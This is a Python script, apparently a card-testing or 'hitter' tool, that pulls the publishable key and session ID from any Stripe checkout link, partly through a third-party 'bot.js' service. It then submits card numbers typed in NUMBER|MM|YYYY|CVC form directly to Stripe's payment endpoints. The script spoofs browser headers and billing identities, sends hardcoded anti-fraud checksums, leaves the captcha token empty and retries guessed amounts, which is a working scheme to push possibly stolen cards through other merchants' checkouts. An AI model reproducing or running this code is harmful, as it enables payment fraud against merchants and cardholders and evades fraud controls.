#!/usr/bin/env python3
"""
STRIPE CHECKOUT PROCESSOR - SIMPLIFIED VERSION
No Playwright - Uses API for PK/CS extraction
"""

import asyncio
import json
import re
import time
import uuid
import requests
from datetime import datetime
from urllib.parse import quote, unquote

class StripeCheckoutProcessor:
    def __init__(self):
        self.pk = None
        self.cs = None
        self.extracted_values = {}
        
    def log(self, message, icon="🔍"):
        """Log with timestamp"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_entry = f"{icon} [{timestamp}] {message}"
        print(log_entry)
    
    def extract_from_api(self, checkout_url):
        """Extract PK and CS from checkout URL using API"""
        print("\n" + "="*60)
        print("🔍 EXTRACTING FROM API")
        print("="*60)
        
        try:
            encoded = quote(checkout_url, safe='')
            api_url = f"https://rylax.pro/bot.js/process?url={encoded}&cc=dummy"
            
            self.log(f"Requesting API: {api_url}", "🌐")
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/plain, */*",
            }
            
            response = requests.get(api_url, headers=headers, timeout=30)
            
            if response.status_code != 200:
                self.log(f"API Error: Status {response.status_code}", "❌")
                return None, None
            
            data = response.json()
            
            if not data.get("success"):
                error_msg = data.get("error", "Unknown API error")
                self.log(f"API Error: {error_msg}", "❌")
                return None, None
            
            checkout = data["checkout_data"]
            pk_live = checkout.get("pk_live")
            cs_live = checkout.get("cs_live")
            
            if pk_live:
                self.pk = pk_live
                self.log(f"Extracted PK: {pk_live[:30]}...", "✅")
            
            if cs_live:
                self.cs = cs_live
                self.log(f"Extracted CS: {cs_live[:30]}...", "✅")
                
            # Also try to extract amount from checkout data
            if "amount" in checkout:
                self.extracted_values['expected_amount'] = str(checkout["amount"])
                amount_usd = int(checkout["amount"]) / 100
                self.log(f"Found amount in API: ${amount_usd:.2f}", "💰")
            
            return pk_live, cs_live
            
        except Exception as e:
            self.log(f"API extraction failed: {str(e)}", "❌")
            return None, None
    
    def manual_extract_from_url(self, checkout_url):
        """Manual extraction from URL as fallback"""
        print("\n" + "="*60)
        print("🔄 MANUAL EXTRACTION FROM URL")
        print("="*60)
        
        # Extract CS from URL
        cs_match = re.search(r'cs_(live|test)_([a-zA-Z0-9_]+)', checkout_url)
        if cs_match:
            self.cs = cs_match.group(0)
            cs_mode = cs_match.group(1)
            self.log(f"Extracted CS from URL: {self.cs[:30]}... ({cs_mode.upper()})", "✅")
        else:
            self.log("❌ No CS found in URL", "❌")
            return False
        
        # Try to get page to extract PK
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            }
            
            response = requests.get(checkout_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                content = response.text
                
                # Look for PK in page
                pk_patterns = [
                    r'(pk_live_[a-zA-Z0-9_]{80,150})',
                    r'(pk_test_[a-zA-Z0-9_]{80,150})',
                    r'publishableKey:\s*["\'](pk_(live|test)_[a-zA-Z0-9_]+)["\']',
                    r'key=([^&\'"\s]+)',
                ]
                
                for pattern in pk_patterns:
                    match = re.search(pattern, content)
                    if match:
                        pk_value = match.group(1) if match.groups() else match.group(0)
                        if pk_value.startswith('pk_'):
                            self.pk = pk_value
                            self.log(f"Found PK in page: {pk_value[:30]}...", "✅")
                            break
                
                # Try to find amount
                amount_patterns = [
                    r'"amount":\s*(\d+)',
                    r'"total":\s*(\d+)',
                    r'amount:\s*(\d+)',
                    r'data-amount="(\d+)"',
                    r'Amount.*?\$(\d+\.?\d*)',
                ]
                
                for pattern in amount_patterns:
                    match = re.search(pattern, content)
                    if match:
                        amount = match.group(1)
                        if '.' in amount:
                            amount = str(int(float(amount) * 100))
                        
                        if amount.isdigit():
                            self.extracted_values['expected_amount'] = amount
                            amount_usd = int(amount) / 100
                            self.log(f"Found amount: ${amount_usd:.2f}", "💰")
                            break
                            
            else:
                self.log(f"Page request failed: {response.status_code}", "⚠️")
                
        except Exception as e:
            self.log(f"Manual extraction error: {str(e)}", "⚠️")
        
        return self.pk is not None
    
    def display_results(self):
        """Display extraction results"""
        print("\n" + "="*60)
        print("🎯 EXTRACTION RESULTS")
        print("="*60)
        
        cs_mode = 'LIVE' if self.cs and 'live' in self.cs else 'TEST'
        pk_mode = 'LIVE' if self.pk and 'live' in self.pk else 'TEST'
        
        print(f"🔑 PK: {self.pk if self.pk else 'NOT FOUND'}")
        print(f"   Mode: {pk_mode}")
        print(f"🔐 CS: {self.cs if self.cs else 'NOT FOUND'}")
        print(f"   Mode: {cs_mode}")
        
        if self.extracted_values:
            print("\n📊 EXTRACTED VALUES:")
            
            if 'expected_amount' in self.extracted_values:
                amount = self.extracted_values['expected_amount']
                amount_usd = int(amount) / 100
                print(f"   expected_amount: ${amount_usd:.2f} ({amount} cents)")
            
            # Show other values if available
            for key in ['init_checksum', 'js_checksum', 'rv_timestamp', 'version', 'eid']:
                if key in self.extracted_values:
                    value = self.extracted_values[key]
                    if value:
                        display = str(value)
                        if len(display) > 30:
                            display = display[:30] + "..."
                        print(f"   {key}: {display}")
        
        if self.pk and self.cs:
            print("\n✅ Ready for payment processing!")
            if cs_mode == 'LIVE':
                print("⚠️  LIVE MODE - Real money will be charged!")
        else:
            print("\n❌ Missing PK or CS - cannot proceed")
        
        print("="*60)
    
    def get_cc_details(self):
        """Get credit card details"""
        print("\n" + "="*60)
        print("💳 ENTER CARD DETAILS")
        print("="*60)
        print("Format: NUMBER|MM|YYYY|CVC or NUMBER|MM|yyyy|CVC")
        print("Example: 4031630918893446|11|2029|099")
        
        cs_mode = 'LIVE' if self.cs and 'live' in self.cs else 'TEST'
        if cs_mode == 'LIVE':
            print("⚠️  LIVE MODE - Real money will be charged!")
        print("="*60)
        
        while True:
            cc_input = input("\nCard: ").strip()
            
            if not cc_input:
                print("❌ Please enter card details")
                continue
                
            if '|' in cc_input:
                parts = cc_input.split('|')
                if len(parts) >= 4:
                    card_number = parts[0].strip().replace(' ', '')
                    exp_month = parts[1].strip()
                    exp_year = parts[2].strip()
                    cvc = parts[3].strip()
                    
                    # Fix year format
                    if len(exp_year) == 2:
                        exp_year = '20' + exp_year
                    elif len(exp_year) != 4:
                        print("❌ Invalid year format (use YY or YYYY)")
                        continue
                    
                    # Validate
                    if len(card_number) < 13 or len(card_number) > 19:
                        print("❌ Invalid card number (13-19 digits)")
                        continue
                    
                    if not exp_month.isdigit() or not (1 <= int(exp_month) <= 12):
                        print("❌ Invalid month (01-12)")
                        continue
                    
                    return {
                        'number': card_number,
                        'exp_month': exp_month.zfill(2),
                        'exp_year': exp_year,
                        'cvc': cvc
                    }
            
            print("❌ Invalid format. Use: NUMBER|MM|YYYY|CVC")
    
    def generate_fresh_session(self):
        """Generate fresh session IDs"""
        base = str(uuid.uuid4()).replace('-', '')
        return {
            'guid': base[:8] + base[8:16] + 'b',
            'muid': base[16:24] + base[24:32] + 'b',
            'sid': base[32:40] + base[40:48] + 'b',
            'client_session_id': str(uuid.uuid4()),
            'checkout_config_id': str(uuid.uuid4())
        }
    
    def make_request_1(self, card_details):
        """First request: Create payment method"""
        print("\n" + "="*60)
        print("🔄 REQUEST 1: CREATE PAYMENT METHOD")
        print("="*60)
        
        session = self.generate_fresh_session()
        
        headers = {
            'Host': 'api.stripe.com',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Sec-Ch-Ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Gpc': '1',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin': 'https://checkout.stripe.com',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://checkout.stripe.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Priority': 'u=1, i'
        }
        
        random_email = f"user{int(time.time())}{uuid.uuid4().hex[:6]}@example.com"
        random_name = f"Test Customer {uuid.uuid4().hex[:8]}"
        
        data_parts = [
            f'type=card',
            f'card%5Bnumber%5D={card_details["number"]}',
            f'card%5Bcvc%5D={card_details["cvc"]}',
            f'card%5Bexp_month%5D={card_details["exp_month"]}',
            f'card%5Bexp_year%5D={card_details["exp_year"][-2:]}',
            f'billing_details%5Bname%5D={quote(random_name)}',
            f'billing_details%5Bemail%5D={quote(random_email)}',
            f'billing_details%5Baddress%5D%5Bcountry%5D=US',
            f'billing_details%5Baddress%5D%5Bline1%5D=123+Main+St',
            f'billing_details%5Baddress%5D%5Bcity%5D=Anytown',
            f'billing_details%5Baddress%5D%5Bpostal_code%5D=12345',
            f'billing_details%5Baddress%5D%5Bstate%5D=CA',
            f'guid={session["guid"]}',
            f'muid={session["muid"]}',
            f'sid={session["sid"]}',
            f'key={self.pk}',
            f'payment_user_agent=stripe.js%2F83c85f9ea0%3B+stripe-js-v3%2F83c85f9ea0%3B+checkout',
            f'client_attribution_metadata%5Bclient_session_id%5D={session["client_session_id"]}',
            f'client_attribution_metadata%5Bcheckout_session_id%5D={self.cs}',
            f'client_attribution_metadata%5Bmerchant_integration_source%5D=checkout',
            f'client_attribution_metadata%5Bmerchant_integration_version%5D=hosted_checkout',
            f'client_attribution_metadata%5Bpayment_method_selection_flow%5D=automatic',
            f'client_attribution_metadata%5Bcheckout_config_id%5D={session["checkout_config_id"]}'
        ]
        
        data = '&'.join(data_parts)
        
        print(f"📤 URL: POST https://api.stripe.com/v1/payment_methods")
        print(f"📦 Data length: {len(data)} bytes")
        print(f"🔑 PK: {self.pk[:20]}...")
        print(f"🔐 CS: {self.cs[:20]}...")
        
        try:
            response = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data,
                timeout=30
            )
            
            print("\n" + "="*60)
            print("📥 RAW RESPONSE 1")
            print("="*60)
            print(f"Status: {response.status_code}")
            print(f"Time: {datetime.now().strftime('%H:%M:%S')}")
            
            try:
                response_json = response.json()
                print(json.dumps(response_json, indent=2))
                
                if 'id' in response_json and response_json['id'].startswith('pm_'):
                    print(f"\n✅ Payment Method ID: {response_json['id']}")
                    print(f"✅ Live mode: {response_json.get('livemode', 'Unknown')}")
                    return response_json
                else:
                    print("\n❌ No payment method ID in response")
                    return None
                    
            except json.JSONDecodeError:
                print(response.text[:500])
                return None
                
        except Exception as e:
            print(f"\n❌ Request failed: {str(e)}")
            return None
    
    def get_expected_amount(self):
        """Get expected amount from user"""
        print("\n" + "="*60)
        print("💰 ENTER PAYMENT AMOUNT")
        print("="*60)
        print("The API didn't extract the amount.")
        print("Please enter the correct amount shown on the checkout page.")
        print("Examples: 4.99 for $4.99, or 499 for 499 cents")
        print("="*60)
        
        while True:
            try:
                amount_input = input("\n💵 Enter amount: ").strip()
                
                if '.' in amount_input:
                    # Dollars with cents
                    amount_dollars = float(amount_input)
                    expected_amount = str(int(amount_dollars * 100))
                else:
                    # Assume cents
                    expected_amount = str(int(amount_input))
                
                # Validate
                if int(expected_amount) > 0:
                    amount_usd = int(expected_amount) / 100
                    print(f"✅ Using amount: ${amount_usd:.2f} ({expected_amount} cents)")
                    self.extracted_values['expected_amount'] = expected_amount
                    return expected_amount
                else:
                    print("❌ Amount must be greater than 0")
            except ValueError:
                print("❌ Invalid amount. Example: 4.99 or 499")
    
    def make_request_2(self, payment_method_id):
        """Second request: Confirm payment"""
        print("\n" + "="*60)
        print("🔄 REQUEST 2: CONFIRM PAYMENT")
        print("="*60)
        
        cs_mode = 'LIVE' if self.cs and 'live' in self.cs else 'TEST'
        if cs_mode == 'LIVE':
            print("⚠️  LIVE MODE - Real money will be charged!")
        
        # Get expected amount
        expected_amount = self.extracted_values.get('expected_amount')
        if not expected_amount:
            expected_amount = self.get_expected_amount()
        
        session = self.generate_fresh_session()
        
        headers = {
            'Host': 'api.stripe.com',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Sec-Ch-Ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Gpc': '1',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin': 'https://checkout.stripe.com',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://checkout.stripe.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Priority': 'u=1, i'
        }
        
        # Use reasonable defaults for other values
        init_checksum = self.extracted_values.get('init_checksum', '1CxvwAYGMwSA9RFlwPUoQvrAWGS7bfqv')
        js_checksum = self.extracted_values.get('js_checksum', 'qto~d%5En0%3DQU%3Eazbu%5Dboc%5DL%5DvDPlR+n%60%3B%7B%26d%3D~%3C%5CvQ%3DXw%24Vato%3FU%5E%60w')
        rv_timestamp = self.extracted_values.get('rv_timestamp', 'qto%3En%3CQ%3DU%26CyY%26%60%3EX%5Er%3CYNr%3CYN%60%3CY_C%3CY_C%3CY%5E%60zY_%60%3CY%5En%7BU%3Eo%26U%26Cy%5B_ex%5B_Mu%5BRMvY_%5C%23X%3DL%26Y_QsY%3DesYxn%3DXbL%3Ee%26Yx%5BOarY%26%23%24Y_exe%25n%7BU%3Ee%26U%26CyYOn%25XR%5Dv%5BOUs%5BOn%3DYb%5C%3De%26oyYOn%3DY%3DQxeRP%23X_%23CXR%5C%3C%5B_Mr%5Bbn%26eRMrdRdDX_%5C%3CXOUrXbex%5BOaveRYyX_erd%25o%3FU%5E%60w')
        version = self.extracted_values.get('version', '83c85f9ea0')
        eid = self.extracted_values.get('eid', 'NA')
        
        # Convert amount to dollars for display
        amount_usd = int(expected_amount) / 100
        
        data_parts = [
            f'eid={eid}',
            f'payment_method={payment_method_id}',
            f'expected_amount={expected_amount}',
            f'expected_payment_method_type=card',
            f'guid={session["guid"]}',
            f'muid={session["muid"]}',
            f'sid={session["sid"]}',
            f'key={self.pk}',
            f'version={version}',
            f'init_checksum={init_checksum}',
            f'js_checksum={js_checksum}',
            f"passive_captcha_token=''",
            f'passive_captcha_ekey=',
            f'rv_timestamp={rv_timestamp}',
            f'referrer=https%3A%2F%2Freplit.com',
            f'client_attribution_metadata%5Bclient_session_id%5D={session["client_session_id"]}',
            f'client_attribution_metadata%5Bcheckout_session_id%5D={self.cs}',
            f'client_attribution_metadata%5Bmerchant_integration_source%5D=checkout',
            f'client_attribution_metadata%5Bmerchant_integration_version%5D=hosted_checkout',
            f'client_attribution_metadata%5Bpayment_method_selection_flow%5D=automatic',
            f'client_attribution_metadata%5Bcheckout_config_id%5D={session["checkout_config_id"]}'
        ]
        
        data = '&'.join(data_parts)
        
        url = f'https://api.stripe.com/v1/payment_pages/{self.cs}/confirm'
        
        print(f"\n📤 URL: POST {url}")
        print(f"📦 Data length: {len(data)} bytes")
        print(f"💳 Payment Method: {payment_method_id}")
        print(f"💰 Expected Amount: ${amount_usd:.2f}")
        print(f"🎯 Mode: {cs_mode}")
        
        print(f"\n📊 USING VALUES:")
        print(f"   eid: {eid}")
        print(f"   expected_amount: {expected_amount} (${amount_usd:.2f})")
        print(f"   version: {version}")
        print(f"   init_checksum: {init_checksum[:20]}...")
        print(f"   js_checksum: {js_checksum[:20]}...")
        print(f"   rv_timestamp: {rv_timestamp[:30]}...")
        
        try:
            response = requests.post(
                url,
                headers=headers,
                data=data,
                timeout=30
            )
            
            print("\n" + "="*60)
            print("📥 RAW RESPONSE 2")
            print("="*60)
            print(f"Status: {response.status_code}")
            print(f"Time: {datetime.now().strftime('%H:%M:%S')}")
            
            try:
                response_json = response.json()
                print(json.dumps(response_json, indent=2))
                
                if response_json.get('status') in ['succeeded', 'requires_action', 'processing', 'requires_capture']:
                    status = response_json.get('status')
                    print(f"\n✅ SUCCESS! Payment status: {status.upper()}")
                    
                    if status == 'succeeded':
                        print("💸 Payment completed successfully!")
                    elif status == 'requires_action':
                        print("⚠️  3D Secure authentication required")
                    elif status == 'processing':
                        print("⏳ Payment is processing...")
                        
                elif 'error' in response_json:
                    error = response_json['error']
                    error_msg = error.get('message', 'Unknown error')
                    error_code = error.get('code', '')
                    print(f"\n❌ Error: {error_msg}")
                    print(f"   Code: {error_code}")
                    
                    # Specific error handling
                    if 'checkout_amount_mismatch' in error_code:
                        print("   💰 Amount mismatch - check expected_amount")
                        print(f"   Used amount: {expected_amount} cents (${amount_usd:.2f})")
                        print("\n   💡 Try different amounts:")
                        print("   - Look at the checkout page for the correct price")
                        print("   - Common amounts: 499, 999, 1999, 4999, 9999 cents")
                        
                        retry = input("\n   Retry with different amount? (y/n): ").strip().lower()
                        if retry == 'y':
                            print("\n" + "="*40)
                            print("🔄 RETRY WITH NEW AMOUNT")
                            expected_amount = self.get_expected_amount()
                            self.extracted_values['expected_amount'] = expected_amount
                            return self.make_request_2(payment_method_id)
                        
                    elif 'resource_missing' in error_code:
                        print("   🔗 Checkout session expired or invalid")
                    elif 'parameter_invalid_empty' in error_code:
                        param = error.get('param', 'unknown')
                        print(f"   📝 Missing parameter: {param}")
                        
                return response_json
            except json.JSONDecodeError:
                print(response.text[:1000])
                return None
                
        except Exception as e:
            print(f"\n❌ Request failed: {str(e)}")
            return None
    
    def process_payment(self):
        """Complete payment processing"""
        if not self.pk:
            print("❌ Cannot process - PK not found")
            return
        if not self.cs:
            print("❌ Cannot process - CS not found")
            return
        
        # Get card details
        card_details = self.get_cc_details()
        
        print(f"\n✅ Card: {card_details['number'][:6]}...{card_details['number'][-4:]}")
        print(f"✅ Exp: {card_details['exp_month']}/{card_details['exp_year']}")
        print(f"✅ Mode: {'LIVE' if 'live' in self.cs else 'TEST'}")
        
        # Request 1
        print("\n" + "="*60)
        print("Sending Request 1...")
        response1 = self.make_request_1(card_details)
        
        if response1 and 'id' in response1:
            payment_method_id = response1['id']
            
            # Request 2
            print("\n" + "="*60)
            proceed = input("Send Request 2 (Confirm Payment)? (y/n): ").strip().lower()
            
            if proceed == 'y':
                print("\n" + "="*60)
                print("Sending Request 2...")
                response2 = self.make_request_2(payment_method_id)
                
                # Save results
                self.save_results(card_details, response1, response2)
            else:
                print("\n⚠️ Request 2 cancelled")
                self.save_results(card_details, response1, None)
        else:
            print("\n❌ Request 1 failed, skipping Request 2")
    
    def save_results(self, card_details, resp1, resp2):
        """Save results to file"""
        result = {
            'timestamp': datetime.now().isoformat(),
            'extracted': {
                'pk': self.pk,
                'cs': self.cs,
                'values': self.extracted_values
            },
            'card_masked': f"{card_details['number'][:6]}...{card_details['number'][-4:]}",
            'responses': {
                'request1': resp1,
                'request2': resp2
            }
        }
        
        filename = f"stripe_result_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(result, f, indent=2, default=str)
        
        print(f"\n💾 Results saved to: {filename}")
    
    def interactive(self):
        """Interactive mode"""
        print("="*60)
        print("STRIPE CHECKOUT PROCESSOR - SIMPLIFIED")
        print("="*60)
        print("No Playwright - Uses API for extraction")
        print("="*60)
        
        while True:
            print("\n" + "-"*60)
            print("📝 Enter Stripe Checkout Link:")
            
            url = input("\nURL: ").strip()
            
            if not url:
                print("❌ Please enter a URL")
                continue
            
            # Reset
            self.pk = None
            self.cs = None
            self.extracted_values = {}
            
            print("\n" + "="*60)
            print("Starting extraction...")
            print("="*60)
            
            # Try API extraction first
            pk, cs = self.extract_from_api(url)
            
            # If API fails, try manual extraction
            if not (pk and cs):
                print("\n🔄 API extraction failed, trying manual extraction...")
                success = self.manual_extract_from_url(url)
            
            if self.pk and self.cs:
                self.display_results()
                
                # Ask to process
                print("\n" + "-"*60)
                process = input("Process payment? (y/n): ").strip().lower()
                
                if process == 'y':
                    self.process_payment()
            else:
                print("\n❌ Extraction failed")
                if not self.pk:
                    print("  - PK not found")
                if not self.cs:
                    print("  - CS not found")
                print("\nTips:")
                print("  - Check if the checkout link is valid")
                print("  - Try a fresh, unpaid checkout link")
            
            print("\n" + "-"*60)
            again = input("Try another checkout link? (y/n): ").strip().lower()
            if again != 'y':
                print("\n👋 Done")
                break

def main():
    """Main function"""
    try:
        processor = StripeCheckoutProcessor()
        processor.interactive()
        
    except KeyboardInterrupt:
        print("\n\n⚠️ Interrupted")
    except Exception as e:
        print(f"\n❌ Error: {str(e)}")

if __name__ == "__main__":
    # Check if requests is installed
    try:
        import requests
    except ImportError:
        print("Installing required packages...")
        import subprocess
        import sys
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        print("✅ Packages installed!")
    
    main()